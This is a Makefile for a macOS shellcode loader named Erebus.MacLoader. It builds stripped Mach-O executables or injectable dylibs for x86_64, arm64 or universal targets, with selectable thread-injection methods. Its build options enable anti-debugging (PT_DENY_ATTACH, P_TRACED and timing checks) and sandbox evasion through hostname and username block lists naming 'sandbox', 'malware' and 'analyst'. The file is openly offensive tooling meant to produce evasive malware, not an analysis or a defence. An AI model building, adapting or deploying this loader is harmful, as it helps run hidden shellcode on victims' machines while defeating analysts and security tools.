# Erebus.MacLoader - macOS Mach-O/dylib shellcode loader
#
# Build variables:
#   ARCH           x86_64 (default) | arm64 | universal
#   TARGET         macho (default) | dylib
#   BUILD          release (default) | debug
#   INJECTION_TYPE 1=mmap_pthread  2=mach_thread
#
# Guardrail toggles (default 0 = disabled):
#   CONFIG_GUARDRAILS_ENABLED  0|1
#   CONFIG_DENY_ATTACH         0|1   - ptrace(PT_DENY_ATTACH)
#   CONFIG_CHECK_DEBUG         0|1   - sysctl P_TRACED flag
#   CONFIG_CHECK_TIMING        0|1   - mach_absolute_time loop check
#   CONFIG_BLOCKED_HOSTNAMES   C-array initialiser e.g. {"sandbox","malware"}
#   CONFIG_BLOCKED_USERNAMES   C-array initialiser e.g. {"analyst","malware"}
#
# Cross-compilation from Linux requires osxcross in PATH.
# On macOS the system clang is used automatically.

ARCH           ?= x86_64
TARGET         ?= macho
BUILD          ?= release
INJECTION_TYPE ?= 1

CONFIG_GUARDRAILS_ENABLED ?= 0
CONFIG_DENY_ATTACH        ?= 1
CONFIG_CHECK_DEBUG        ?= 1
CONFIG_CHECK_TIMING       ?= 0

OUT_MACHO := erebus_mac
OUT_DYLIB := erebus_mac.dylib

SRCS := src/main.c \
        src/loader.c \
        src/evasion/guardrails.c \
        src/injection/mmap_pthread.c \
        src/injection/mach_thread.c

OBJS := $(SRCS:.c=.o)

# Detect toolchain: prefer osxcross on Linux, clang on macOS
UNAME := $(shell uname -s 2>/dev/null || echo "Linux")

ifeq ($(ARCH),universal)
    # Universal binary: build both slices then lipo them together
    CC_X64  := $(if $(findstring Darwin,$(UNAME)),clang,o64-clang)
    CC_ARM  := $(if $(findstring Darwin,$(UNAME)),clang,oa64-clang)
    ARCH_FLAGS_X64 := -target x86_64-apple-macos10.15
    ARCH_FLAGS_ARM := -target arm64-apple-macos11
else
    CC := $(if $(findstring Darwin,$(UNAME)),clang,o64-clang)
    ifeq ($(ARCH),arm64)
        ARCH_FLAGS := -target arm64-apple-macos11
    else
        ARCH_FLAGS := -target x86_64-apple-macos10.15
    endif
endif

CFLAGS_COMMON := \
    -I include \
    -std=c11 \
    -Wall \
    -Wno-unused-function \
    -Wno-unused-variable \
    -fno-stack-protector \
    -fvisibility=hidden \
    -DCONFIG_INJECTION_TYPE=$(INJECTION_TYPE) \
    -DCONFIG_GUARDRAILS_ENABLED=$(CONFIG_GUARDRAILS_ENABLED) \
    -DCONFIG_DENY_ATTACH=$(CONFIG_DENY_ATTACH) \
    -DCONFIG_CHECK_DEBUG=$(CONFIG_CHECK_DEBUG) \
    -DCONFIG_CHECK_TIMING=$(CONFIG_CHECK_TIMING)

ifeq ($(BUILD),release)
    CFLAGS  := $(CFLAGS_COMMON) -Os -ffunction-sections -fdata-sections
    LDFLAGS := -Wl,-dead_strip -Wl,-S
else
    CFLAGS  := $(CFLAGS_COMMON) -g -O0
    LDFLAGS :=
endif

ifdef CONFIG_BLOCKED_HOSTNAMES
    CFLAGS += -DCONFIG_BLOCKED_HOSTNAMES='$(CONFIG_BLOCKED_HOSTNAMES)'
endif
ifdef CONFIG_BLOCKED_USERNAMES
    CFLAGS += -DCONFIG_BLOCKED_USERNAMES='$(CONFIG_BLOCKED_USERNAMES)'
endif

.PHONY: all macho dylib universal clean

all: $(TARGET)

macho: $(OBJS)
	$(CC) $(ARCH_FLAGS) $(OBJS) $(LDFLAGS) -framework CoreFoundation -lpthread -o $(OUT_MACHO)

dylib: CFLAGS += -fPIC
dylib: $(OBJS)
	$(CC) $(ARCH_FLAGS) $(OBJS) $(LDFLAGS) -dynamiclib -framework CoreFoundation -lpthread -o $(OUT_DYLIB)

universal:
	$(MAKE) ARCH=x86_64 CC=$(CC_X64) CFLAGS_EXTRA="$(ARCH_FLAGS_X64)" $(TARGET)
	cp $(OUT_MACHO) $(OUT_MACHO)_x86_64
	$(MAKE) ARCH=arm64  CC=$(CC_ARM) CFLAGS_EXTRA="$(ARCH_FLAGS_ARM)" $(TARGET)
	cp $(OUT_MACHO) $(OUT_MACHO)_arm64
	lipo -create $(OUT_MACHO)_x86_64 $(OUT_MACHO)_arm64 -output $(OUT_MACHO)_universal
	mv $(OUT_MACHO)_universal $(OUT_MACHO)
	rm -f $(OUT_MACHO)_x86_64 $(OUT_MACHO)_arm64

%.o: %.c
	$(CC) $(ARCH_FLAGS) $(CFLAGS) $(CFLAGS_EXTRA) -c $< -o $@

clean:
	rm -f $(OBJS) $(OUT_MACHO) $(OUT_DYLIB)
